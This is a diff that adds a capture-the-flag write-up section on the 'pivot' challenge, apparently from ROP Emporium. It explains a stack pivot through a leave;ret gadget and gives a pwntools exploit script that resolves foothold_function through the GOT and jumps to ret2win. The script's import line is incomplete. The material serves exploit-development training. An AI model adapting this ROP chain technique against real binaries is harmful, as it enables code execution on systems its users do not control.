@@ -328,6 +328,68 @@ io.interactive()
 ```
 ## pivot
 
+in this challenge we are asked to perform a stack pivot
+
+a stack pivot is a technique which effectively changes the address of the stack, its a technique that is commonly used when the stack doesnt hold enough space for our rop chain, by utilizing it we can construct a large chain in any writable and executable section in memory we want (typically any free space where we can place a rop chain) and continue executing from there
+
+we first perform the stack pivot using a `leave; ret` gadget, the leave ret gadget essentially executes the following instructions: `mov rsp, rbp; pop rbp`, that means is that our overwritten rbp is absorbed by rsp which makes the cpu think that the new stack is at the address the rbp holds, after it pops the next 8 bytes so we insert a dummy rbp address so our first 8 bytes of the chain don't get absorbed
+we call the plt entry of the `foothold_function()` to write its randomized memory address (remember its an external function) into the got, we then derefrence the address of `foothold_function@got` to get the randomized address into the rax register, we then use `pop rbp` to get the offset of `ret2win()` into the rbp and then add it into rax (the randomized foothold_function address) to get the runtime address of ret2win and then we `jmp rax` to jump into it
+
+```python
+from pwn import
+
+context.log_level = 'debug'
+context.arch = 'amd64'
+
+elf = ELF('./pivot')
+rop = ROP(elf)
+io = process(elf.path)
+libpivot = ELF('./libpivot.so')
+
+bss = elf.bss()
+
+offset_ret2win = libpivot.symbols['ret2win'] - libpivot.symbols['foothold_function']
+offset_to_rbp = 32
+leave_ret = rop.find_gadget(['leave', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
+pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
+mov_rax_qptr_rax = 0x4009c0
+pop_rbp = rop.find_gadget(['pop rbp', 'ret'])[0]
+add_rax_rbp = 0x4009c4 
+jmp_rax = 0x4007c1 
+foothold_plt = elf.plt['foothold_function']
+foothold_got = elf.got['foothold_function']
+
+io.recvuntil(b'The Old Gods kindly bestow upon you a place to pivot: ')
+pivot_leak = io.recvline().strip() 
+pivot_addr = int(pivot_leak, 16)
+log.success(f'address to pivot: {hex(pivot_addr)}')
+
+rop_payload = b'FAKE_RBP'
+rop_payload += p64(foothold_plt)
+rop_payload += p64(pop_rax)
+rop_payload += p64(foothold_got)
+rop_payload += p64(mov_rax_qptr_rax)
+rop_payload += p64(pop_rbp)
+rop_payload += p64(offset_ret2win)
+rop_payload += p64(add_rax_rbp)
+rop_payload += p64(jmp_rax)
+
+io.recvuntil(b'> ')
+io.sendline(rop_payload)
+
+pivot_payload = b'A' * offset_to_rbp
+pivot_payload += p64(pivot_addr)
+pivot_payload += p64(leave_ret)
+
+io.recvuntil(b'> ')
+io.sendline(pivot_payload)
+
+io.interactive()
+```
+
 ## ret2csu
 
 
